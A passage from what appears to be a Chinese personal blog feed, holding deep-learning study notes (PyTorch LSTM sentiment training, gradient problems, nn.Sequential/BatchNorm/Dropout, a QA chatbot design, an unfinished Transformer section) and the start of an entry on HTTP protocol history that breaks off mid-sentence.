punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> idx <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_dataloader<span class="token punctuation">)</span><span class="token punctuation">,</span> loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>acc<span class="token punctuation">)</span><span class="token punctuation">)</span>            torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>imdb_model<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"model/mnist_net.pkl"</span><span class="token punctuation">)</span>            torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>optimizer<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'model/mnist_optimizer.pkl'</span><span class="token punctuation">)</span>             <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    mode <span class="token operator">=</span> <span class="token boolean">False</span>    imdb_model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    test_dataloader <span class="token operator">=</span> get_dataloader<span class="token punctuation">(</span>mode<span class="token punctuation">,</span> test_batch_size<span class="token punctuation">)</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">,</span> input_lenght<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>            target <span class="token operator">=</span> target<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>            <span class="token builtin">input</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>            output <span class="token operator">=</span> imdb_model<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>            test_loss  <span class="token operator">=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>output<span class="token punctuation">,</span> target<span class="token punctuation">,</span>reduction<span class="token operator">=</span><span class="token string">"mean"</span><span class="token punctuation">)</span>            pred <span class="token operator">=</span> torch<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span>dim<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>keepdim<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            correct <span class="token operator">=</span> pred<span class="token punctuation">.</span>eq<span class="token punctuation">(</span>target<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            acc <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> pred<span class="token punctuation">.</span>eq<span class="token punctuation">(</span>target<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'idx: {} Test set: Avg. loss: {:.4f}, Accuracy: {}/{} ({:.2f}%)\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>test_loss<span class="token punctuation">,</span> correct<span class="token punctuation">,</span> target<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>acc<span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        train<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        test<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-3-模型训练的最终输出">2.3 模型训练的最终输出</h5><pre class="line-numbers language-none"><code class="language-none">...Train Epoch: 9 [20480/25000 (82%)]Loss: 0.017165 ACC: 100.000000Train Epoch: 9 [21120/25000 (84%)]Loss: 0.021572 ACC: 98.437500Train Epoch: 9 [21760/25000 (87%)]Loss: 0.058546 ACC: 98.437500Train Epoch: 9 [22400/25000 (90%)]Loss: 0.045248 ACC: 98.437500Train Epoch: 9 [23040/25000 (92%)]Loss: 0.027622 ACC: 98.437500Train Epoch: 9 [23680/25000 (95%)]Loss: 0.097722 ACC: 95.312500Train Epoch: 9 [24320/25000 (97%)]Loss: 0.026713 ACC: 98.437500Train Epoch: 9 [15600/25000 (100%)]Loss: 0.006082 ACC: 100.000000idx: 0 Test set: Avg. loss: 0.8794, Accuracy: 4053/5000 (81.06%)idx: 1 Test set: Avg. loss: 0.8791, Accuracy: 4018/5000 (80.36%)idx: 2 Test set: Avg. loss: 0.8250, Accuracy: 4087/5000 (81.74%)idx: 3 Test set: Avg. loss: 0.8380, Accuracy: 4074/5000 (81.48%)idx: 4 Test set: Avg. loss: 0.8696, Accuracy: 4027/5000 (80.54%)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到模型的测试准确率稳定在81%左右。</p><p>大家可以把上述代码改为GRU，或者多层LSTM继续尝试，观察效果</p><h3 id="2-5-Pytorch中的序列化容器">2.5 Pytorch中的序列化容器</h3><h4 id="1-梯度消失和梯度爆炸">1. 梯度消失和梯度爆炸</h4><p>在使用pytorch中的序列化 容器之前，我们先来了解一下常见的梯度消失和梯度爆炸的问题</p><h5 id="1-1-梯度消失">1.1 梯度消失</h5><p>假设我们有四层极简神经网络：每层只有一个神经元</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E6%A2%AF%E5%BA%A6%E6%B6%88%E5%A4%B1.png" alt=""></p><p>$获取w1的梯度有：▽w1 = x1*f(a1)’<em>w2</em>f(b1)’<em>w3</em>▽out$</p><p>假设我们使用sigmoid激活函数，即f为sigmoid函数，sigmoid的导数如下图</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5Csigmoid%E5%AF%BC%E6%95%B0.png" alt=""></p><p>假设每层都取得sigmoid导函数的最大值1/4，那么在反向传播时，$X1=0.5,w1=w2=w3=0.5$</p><p>$\nabla w1&lt; \frac{1}{2} * \frac{1}{4}* \frac{1}{2}* \frac{1}{4}<em>\frac{1}{2}</em>\nabla out = \frac{1}{2^7} \nabla out$</p><p>当权重初始过小或使用<code>易饱和神经元(sigmoid,tanh，) sigmoid在y=0,1处梯度接近0，而无法更新参数</code>，时神经网络在反向传播时也会呈现指数倍缩小，产生“消失”现象。</p><h5 id="1-2-梯度爆炸">1.2 梯度爆炸</h5><p>假设$X2=2,w1=w2=w3=2$</p><p>$\nabla w1 = f’{a}<em>2</em>f‘{a}*x2\nabla out = 2^3f’(a)^2 \nabla out $</p><p>当权重初始过大时，梯度神经网络在反向传播时也会呈现指数倍放大，产生“爆炸”现象。</p><h5 id="1-3-解决梯度消失或者梯度爆炸的经验">1.3 解决梯度消失或者梯度爆炸的经验</h5><ol><li><p><strong>替换易训练神经元</strong></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E6%9B%BF%E6%8D%A2%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0.png" alt=""></p></li><li><p>**改进梯度优化算法：**使用adam等算法</p></li><li><p><strong>使用batch normalization</strong></p></li></ol><h4 id="2-nn-Sequential">2. <code>nn.Sequential</code></h4><p><code>nn.Sequential</code>是一个有序的容器，其中传入的是构造器类(各种用来处理input的类)，最终input会被Sequential中的构造器类依次执行</p><p>例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">layer <span class="token operator">=</span> nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>input_dim<span class="token punctuation">,</span> n_hidden_1<span class="token punctuation">)</span><span class="token punctuation">,</span>             nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>， <span class="token comment">#inplace=False 是否对输入进行就地修改，默认为False</span>            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n_hidden_1<span class="token punctuation">,</span> n_hidden_2<span class="token punctuation">)</span>，            nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>，            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n_hidden_2<span class="token punctuation">,</span> output_dim<span class="token punctuation">)</span> <span class="token comment"># 最后一层不需要添加激活函数</span>             <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上述就够中，可以直接调用layer(x)，得到输出</p><p>x的被执行顺序就是Sequential中定义的顺序：</p><ol><li>被隐层1执行，形状变为[batch_size,n_hidden_1]</li><li>被relu执行，形状不变</li><li>被隐层2执行，形状变为[batch_size,n_hidden_2]</li><li>被relu执行，形状不变</li><li>被最后一层执行，形状变为[batch_size,output_dim]</li></ol><h4 id="3-nn-BatchNorm1d">3. <code>nn.BatchNorm1d</code></h4><p><code>batch normalization</code>  翻译成中文就是批规范化，即在每个batch训练的过程中，对参数进行归一化的处理，从而达到加快训练速度的效果。</p><p>以sigmoid激活函数为例，他在反向传播的过程中，在值为0,1的时候，梯度接近0，导致参数被更新的幅度很小，训练速度慢。但是如果对数据进行归一化之后，就会尽可能的把数据拉倒[0-1]的范围，从而让参数更新的幅度变大，提高训练的速度。</p><p>batchNorm一般会放到激活函数之后，即对输入进行激活处理之后再进入batchNorm</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">layer <span class="token operator">=</span> nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>input_dim<span class="token punctuation">,</span> n_hidden_1<span class="token punctuation">)</span><span class="token punctuation">,</span>                nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>，     nn<span class="token punctuation">.</span>BatchNorm1d<span class="token punctuation">(</span>n_hidden_1<span class="token punctuation">)</span>                nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n_hidden_1<span class="token punctuation">,</span> n_hidden_2<span class="token punctuation">)</span>，            nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>，    nn<span class="token punctuation">.</span>BatchNorm1d<span class="token punctuation">(</span>n_hidden_2<span class="token punctuation">)</span>            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n_hidden_2<span class="token punctuation">,</span> output_dim<span class="token punctuation">)</span>              <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-nn-Dropout">4. <code>nn.Dropout</code></h4><p>dropout在前面已经介绍过，可以理解为对参数的随机失活</p><ol><li>增加模型的稳健性</li><li>可以解决过拟合的问题（增加模型的泛化能力）</li><li>可以理解为训练后的模型是多个模型的组合之后的结果，类似随机森林。</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">layer <span class="token operator">=</span> nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>            nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>input_dim<span class="token punctuation">,</span> n_hidden_1<span class="token punctuation">)</span><span class="token punctuation">,</span>            nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>，     nn<span class="token punctuation">.</span>BatchNorm1d<span class="token punctuation">(</span>n_hidden_1<span class="token punctuation">)</span>    nn<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span> <span class="token comment">#0.3 为dropout的比例，默认值为0.5</span>                nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n_hidden_1<span class="token punctuation">,</span> n_hidden_2<span class="token punctuation">)</span>，            nn<span class="token punctuation">.</span>ReLU<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>，    nn<span class="token punctuation">.</span>BatchNorm1d<span class="token punctuation">(</span>n_hidden_2<span class="token punctuation">)</span>    nn<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>                nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n_hidden_2<span class="token punctuation">,</span> output_dim<span class="token punctuation">)</span>              <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1>项目实现</h1><h3 id="文本分类">文本分类</h3><p>fasttext文本分类</p><h3 id="闲聊机器人">闲聊机器人</h3><h3 id="QA机器人">QA机器人</h3><h4 id="问答机器人介绍">问答机器人介绍</h4><h5 id="1-问答机器人">1. 问答机器人</h5><p>在前面的课程中，我们已经对问答机器人介绍过，这里的问答机器人是我们在分类之后，对特定问题进行回答的一种机器人。至于回答的问题的类型，取决于我们的语料。</p><p>当前我们需要实现的问答机器人是一个回答编程语言（比如<code>python是什么</code>，<code>python难么</code>等）相关问题的机器人</p><h5 id="2-问答机器人的实现逻辑">2. 问答机器人的实现逻辑</h5><p>主要实现逻辑：从现有的问答对中，选择出和问题最相似的问题，并且获取其相似度（一个数值），如果相似度大于阈值，则返回这个最相似的问题对应的答案</p><p>问答机器人的实现可以大致分为三步步骤：</p><ol><li>对问题的处理</li><li>对答案进行的机器学习召回</li><li>对召回的结果进行排序</li></ol><h5 id="2-1-对问题的处理">2.1 对问题的处理</h5><p>对问题的处理过程中，我们可以考虑以下问题：</p><ol><li>对问题进行基础的清洗，去除特殊符号等</li><li>问题主语的识别，判断问题中是否包含特定的主语，比如<code>python</code>等，提取出来之后，方便后续对问题进行过滤。<ul><li>可以看出，不仅需要对用户输入的问题进行处理，获取主语，还需要对现有问答对进行处理</li></ul></li><li>获取问题的词向量，可以考虑使用词频，tdidf等值，方便召回的时候使用</li></ol><h5 id="2-2-问题的召回">2.2 问题的召回</h5><p>召回：可以理解为是一个海选的操作，就是从现有的问答对中选择可能相似的前K个问题。</p><p>为什么要进行召回?</p><blockquote><p>主要目的是为了后续进行排序的时候，减少需要计算的数据量，比如有10万个问答对，直接通过深度学习肯定是可以获取所有的相似度，但是速度慢。</p><p>所以考虑使用机器学习的方法进行一次海选</p></blockquote><p>那么，如何实现召回呢？</p><blockquote><p>前面我们介绍，召回就是选择前K个最相似的问题，所以召回的实现就是想办法通过机器学习的手段计算器相似度。</p></blockquote><p>可以思考的方法：</p><ol><li>使用词袋模型，获取词频矩阵，计算相似度</li><li>使用tfidf，获取tdidf的矩阵，计算相似度</li></ol><p>上述的方法理论上都可行，知识当候选计算的词语数量太多的时候，需要挨个计算相似度，非常耗时。</p><p>所以可以考虑以下两点：</p><ol><li>通过前面获取的主语，对问题进行过滤</li><li>使用聚类的方法，对数据先聚类，再计算某几个类别中的相似度，而不用去计算全部。</li></ol><p>但是还有一个问题，供大家慢慢思考：</p><blockquote><p>不管是词频，还是tdidf，获取的结果肯定是没有考虑文字顺序的，效果不一定是最好的，那么此时，应该如何让最后召回的效果更好呢？</p></blockquote><h5 id="2-3-问题的排序">2.3 问题的排序</h5><p>排序过程，使用了召回的结果作为输入，同时输出的是最相似的那一个。</p><p>整个过程使用深度学习实现。深度学习虽然训练的速度慢，但是整体效果肯定比机器学习好（机器学习受限于特征工程，数据量等因素，没有办法深入的学会不同问题之间的内在相似度），所以通过自建的模型，获取最后的相似度。</p><p>使用深度学习的模型这样一个黑匣子，在训练数据足够多的时候，能够学习到用户的各种不同输入的问题，当我们把目标值（相似的问题）给定的情况下，让模型自己去找到这些训练数据目标值和特征值之间相似的表示方法。</p><p>那么此时，有以下两个问题：</p><ol><li><p>使用什么数据，来训练模型，最后返回模型的相似度</p><blockquote><p>训练的数据的来源：可以考虑根据现有的问答对去手动构造，但是构造的数据不一定能够覆盖后续用户提问的全部问题。所以可以考虑通过程序去采集网站上相似的问题，比如百度知道的搜索结果。</p></blockquote></li><li><p>模型该如何构建</p><blockquote><p>模型可以有两个输入，输出为一个数值，两个输入的处理方法肯定是一样的。这种网络结构我们经常把它称作孪生神经网络。</p></blockquote><p>很明显，我们队输入的数据需要进行编码的操作，比如word embedding + LSTM/GRU/BIGRU等</p><p>两个编码之后的结果，我们可以进行组合，然后通过一个多层的神经网络，输出一个数字，把这个数值定义为我们的相似度。</p><p>当然我们的深层的神经网络在最开始的时候也并不是计算的相似度，但是我们的训练数据的目标值是相似度，在N多次的训练之后，确定了输入和输出的表示方法之后，那么最后的模型输出就是相似度了。</p></li></ol><p>前面我们介绍了问答机器人的实现的大致思路，那么接下来，我们就来一步步的实现它</p><h1>深度学习进阶</h1><h2 id="Transformer">Transformer</h2><h4 id="1-Transformer-直观认识">1. Transformer 直观认识</h4><p>Transformer 和 LSTM 的最大区别，就是 LSTM 的训练是迭代的、串行的，必须要等当前字处理完，才可以处理下一个字。而 Transformer 的训练时并行的，即所有<strong>字</strong>是同时训练的，这样就大大增加了计算效率。Transformer 使用了位置嵌入 (Positional Encoding) 来理解语言的顺序，使用自注意力机制（Self Attention Mechanism）和全连接层进行计算，这些后面会讲到</p><p>Transformer 模型主要分为两大部分，分别是 <strong>Encoder</strong> 和 <strong>Decoder</strong>。<strong>Encoder</strong> 负责把输入（语言序列）隐射成<strong>隐藏层</strong>（下图中第 2 步用九宫格代表的部分），然后解码器再把隐藏层映射为自然语言序列。例如下图机器翻译的例子（Decoder 输出的时候，是通过 N 层 Decoder Layer 才输出一个 token，并不是通过一层 Decoder Layer 就输出一个 token）</p><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/Transformer.png" alt=""></p><h4 id="2-Positional-Encoding">2. Positional Encoding</h4><p>由于 Transformer 模型<strong>没有</strong>循环神经网络的迭代操作，所以我们必须提供每个字的位置信息给 Transformer，这样它才能识别出语言中的顺序关系</p><p>现在定义一个<strong>位置嵌入</strong>的概念，也就是 Positional Encoding，位置嵌入的维度为 <code>[max_sequence_length, embedding_dimension]</code>, 位置嵌入的维度与词向量的维度是相同的，都是 <code>embedding_dimension</code>。<code>max_sequence_length</code> 属于超参数，指的是限定每个句子最长由多少个词构成</p><p>注意，我们一般以<strong>字</strong>为单位训练 Transformer 模型。首先初始化字编码的大小为 <code>[vocab_size, embedding_dimension]</code>，<code>vocab_size</code> 为字库中所有字的数量，<code>embedding_dimension</code> 为字向量的维度，对应到 PyTorch 中，其实就是 <code>nn.Embedding(vocab_size, embedding_dimension)</code></p><p>论文中使用了 sin 和 cos 函数的线性变换来提供给模型位置信息:<br>$$<br>PE(pos,2i) = sin(pos/100002i/dmodel)<br>PE(pos,2i+1)=cos(pos/100002i/dmodel)<br>$$</p><p>上式中 pos 指的是一句话中某个字的位置，取值范围是 [0, max_sequence_length)，i 指的是字向量的维度序号，取值范围是 [0, embedding_dimension/2)，dmodel 指的是 embedding_dimension 的值</p><p>上面有 sin 和 cos 一组公式，也就是对应着 embedding dimension 维度的一组奇数和偶数的序号的维度，例如 0,1 一组，2,3 一组，分别用上面的 sin 和 cos 函数做处理，从而产生不同的周期性变化，而位置嵌入在 embedding dimension 维度上随着维度序号增大，周期变化会越来越慢，最终产生一种包含位置信息的纹理，就像论文原文中第六页讲的，位置嵌入函数的周期从 2π 到 10000∗2π 变化，而每一个位置在 embedding dimension 维度上都会得到不同周期的 sin 和 cos 函数的取值组合，从而产生独一的纹理位置信息，最终使得模型学到位置之间的依赖关系和自然语言的时序特性</p><p>如果不理解这里为何这么设计，可以看这篇文章 <a href="https://wmathor.com/index.php/archives/1453/">Transformer 中的 Positional Encoding</a></p><p>下面画一下位置嵌入，纵向观察，可见随着 embedding dimension 序号增大，位置嵌入函数的周期变化越来越平缓</p><h4 id="3-Self-Attention-Mechanism">3. Self Attention Mechanism</h4><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5Cimage-20210202175624692.png" alt=""></p><h4 id="4-残差连接和-Layer-Normalization">4. 残差连接和 Layer Normalization</h4><h4 id="5-Transformer-Encoder-整体结构">5. Transformer Encoder 整体结构</h4><h4 id="6-Transformer-Decoder-整体结构">6. Transformer Decoder 整体结构</h4><p>总结</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议原理和实践</title>
      <link href="2020/09/23/http/"/>
      <url>2020/09/23/http/</url>
      
        <content type="html"><![CDATA[<h1>HTTP协议原理和实践</h1><img src="http.png" alt="浏览器输入URL后HTTP请求返回的过程" style="zoom:120%;"><p>​</p><h2 id="1-HTTP协议基础">1. HTTP协议基础</h2><h3 id="1-1-五层模型">1.1 五层模型</h3><p><img src="331769-20181124200628267-282150559.png" alt="TCP/IP五层模型"></p><p><img src="705728-20160424234827195-1493107425.png" alt=""></p><ul><li><p>物理层：主要作用是定义物理设备如何传输数据</p></li><li><p>数据链路层：在通信的实体间建立数据链路连接</p></li><li><p>网络层：为数据在结点之间传输创建逻辑链路</p></li></ul><p>​</p><ul><li>传输层：向用户提供可靠的端到端（End-to-End）服务（传输层向高层屏蔽了下层数据通信的细节）</li><li>应用层：为应用软件提供了服务（屏蔽了网络传输相关细节）</li></ul><p>​</p><p>  HTTP 协议的传输过程就是通过协议栈逐层向下，每一层都添加本层的专有数据，层层打包，然后通过下层发送出去。接收数据是则是相反的操作，从下往上穿过协议栈，逐层拆包，每层去掉本层的专有头，上层就会拿到自己的数据。下层的传输过程对于上层是完全“透明”的，上层也不需要关心下层的具体实现细节。</p><p>​</p><p>​</p><h3 id="1-2-HTTP协议简介">1.2 HTTP协议简介</h3><blockquote><p>HTTP是什么？</p><p>HTTP 是一个在计算机世界里专门在<strong>两点之间</strong>传输文字、图片、音频、视频等超文本数据的约定和规范</p></blockquote><p>​</p><p>  <strong>HTTP</strong>是 <code>Hyper Text Transfer Protocol</code> **（超文本传输协议）**的缩写。它的发展是万维网协会和Internet工作小组IETF合作的结果。它确立了一种计算机之间交流通信的规范，以及相关的各种控制和错误处理方式。</p><p>  <strong>HTTP是一个应用层协议</strong>，由请求和响应构成，是一个标准的客户端服务器模型。</p><p>  因为 <strong>HTTP</strong> 是一个协议，是一种计算机间通信的规范，所以它<strong>不存在“单独的实体”</strong>。它不是应用程序，也不是操作系统，更不是 Web 服务器。但 HTTP 又与应用程序、操作系统、Web 服务器密切相关，在它们之间的通信过程中存在，而且是一种“动态的存在”，是发生在网络连接、传输超文本数据时的一个“动态过程”。</p><p>  在互联网世界里，<strong>HTTP 通常跑在 TCP/IP 协议栈之上</strong>，依靠 <code>IP 协议</code>实现寻址和路由、<code>TCP 协议</code>实现可靠数据传输、<code>DNS协议</code>实现域名查找、<code>SSL/TLS 协议</code>实现安全通信。此外，还有一些协议依赖于它，例如 <code>WebSocket</code>、<code>HTTPDNS</code> 等。这些协议相互交织，构成了一个协议网，而 <strong>HTTP</strong> 处于中心地位。</p><p>​</p><blockquote><p>把这些综合起来，使用递归缩写方式，我们可以把 HTTP 定义为“<strong>与 HTTP 协议相关的所有应用层技术的总和</strong>”</p></blockquote><p>​</p><p>​</p><h3 id="1-3-HTTP协议发展历史">1.3 HTTP协议发展历史</h3><h4 id="史前时期">史前时期</h4><p>  20 世纪 60 年代，美国国防部高等研究计划署建立了 <code>ARPA</code> 网，它有四个分布在各地的节点，被认为是如今互联网的“始祖”。最早的阿帕网还是非常简陋的，<strong>网络控制协议</strong><code>Network Control Protocol</code>**（NCP）**是阿帕网中连接不同计算机的通信协议。</p><p>  <strong>NCP</strong>诞生两年后，开发者温特·瑟夫和罗伯特·卡恩一起开发了一个阿帕网的下一代协议，并在 1974 年发表了以分组、序列化、流量控制、超时和容错等为核心的一种新型的网络互联协议，一举奠定了 <code>TCP/IP</code> 协议的基础。</p><p>  由于具有良好的分层结构和稳定的性能，TCP/IP 协议迅速战胜其他竞争对手流行起来，并在 80 年代中期进入了 <code>UNIX</code> 系统内核，促使更多的计算机接入了互联网。</p><p>​</p><blockquote><p>TCP/IP 的成功不是偶然的，而是综合了几个因素后的结果：</p><ol><li>TCP/IP 是免费或者是少量收费的，这样就扩大了使用人群</li><li>TCP/IP 搭上了 UNIX 这辆时代快车，很快推出了基于套接字（socket）的实际编程接口</li><li>TCP/IP 来源于实际需求，TCP/IP 解决了实际问题，并且在实际中不断完善</li></ol></blockquote><p>​</p><h4 id="创世纪">创世纪</h4><p>  1989 年，任职于欧洲核子研究中心的<code>Tim Berners-Lee</code>发表了一篇论文，提出了在互联网上构建超链接文档系统的构想。这篇论文中他确立了三项关键技术。</p><ol><li><code>URI</code>：<code>Uniform Resource Identifier</code>即统一资源标识符，包括<code>URL</code>和<code>URN</code>，作为互联网上资源的唯一身份</li><li><code>HTML</code>：即超文本标记语言，描述超文本文档</li><li><code>HTTP</code>：即超文本传输协议，用来传输超文本</li></ol><p>  基于它们，就可以把超文本系统完美地运行在互联网上，让各地的人们能够自由地共享信息，蒂姆把这个系统称为<code>World Wide Web</code>，也就是我们现在所熟知的 <code>Web</code></p><p>​</p><h4 id="HTTP-0-9">HTTP/0.9</h4><ul><li><p>只有一个命令GET</p></li><li><p>没有HEADER等描述数据的信息</p></li><li><p>服务器发送完毕，就关闭TCP连接</p></li></ul><p>​</p><p>  20 世纪 90 年代初期的互联网世界非常简陋，计算机处理能力低，存储容量小，网速很慢，还是一片“信息荒漠”。网络上绝大多数的资源都是纯文本，很多通信协议也都使用纯文本，所以 HTTP 的设计也不可避免地受到了时代的限制。</p><p>  这一时期的 HTTP 被定义为 0.9 版，结构简单，为了便于服务器和客户端处理，它也采用了纯文本格式。蒂姆最初设想的系统里的文档都是只读的，所以只允许用<code>GET</code>动作从服务器上获取 HTML 文档，并且在响应请求之后立即关闭连接，功能非常有限。</p><p>  HTTP/0.9 虽然很简单，但作为一个“原型”，充分验证了 Web 服务的可行性。</p><p>​</p><h4 id="HTTP-1-0">HTTP/1.0</h4><ul><li>增加了 HEAD、POST 等命令</li><li>增加了响应状态码 <code>Status code</code>，标记可能的错误原因</li><li>增加了 HTTP Header，让 HTTP 处理请求和响应更加灵活</li><li>引入了协议版本号概念</li><li>传输的数据不再仅限于文本</li></ul><p>​</p><p>  1993 年，美国国家超级计算应用中心开发出了 <strong>Mosaic</strong>，是第一个可以图文混排的浏览器，随后又在 1995 年开发出了服务器软件 <strong>Apache</strong>，简化了 HTTP 服务器的搭建工作。</p><p>  同一时期，计算机多媒体技术也有了新的发展：1992 年发明了 <strong>JPEG</strong> 图像格式，1995 年发明了 <strong>MP3</strong> 音乐格式。</p><p>  这些新软件新技术一经推出立刻就吸引了广大网民的热情，更的多的人开始使用互联网，研究 HTTP 并提出改进意见，甚至实验性地往协议里添加各种特性，从用户需求的角度促进了 HTTP 的发展。</p><p>  在这些已有实践的基础上，经过一系列的草案，HTTP/1.0 版本在 1996 年正式发布。它在多方面增强了 0.9 版，形式上已经和我们现在的 HTTP 差别不大。</p><blockquote><p>但是HTTP/1.0 并不是一个“标准”，只是记录已有实践和模式的一份参考文档，不具有实际的约束力，相当于一个“备忘录”。</p></blockquote><p>​</p><h4 id="HTTP-1-1">HTTP/1.1</h4><ul><li>明确了连接管理，允许持久连接</li><li>增加了 PUT、DELETE 等新命令</li><li>增加了缓存管理和控制</li><li>允许响应数据分块**（chunked）**，利于传输大文件</li><li>增加 Host ，让互联网主机托管成为可能</li></ul><p>​</p><p>  1995 年，网景的 Netscape Navigator 和微软的 Internet Explorer 开始了著名的“浏览器大战”，都希望在互联网上占据主导地位。最终微软的 IE 取得了胜利。不可否认的是，它再一次极大地推动了 Web 的发展，HTTP/1.0 也在这个过程中经受了实践检验。</p><p>  在“浏览器大战”结束之后的 1999 年，<strong>HTTP/1.1 发布了 RFC 文档，编号为 2616</strong>，正式确立了延续十余年的传奇。HTTP/1.1 是对 HTTP/1.0 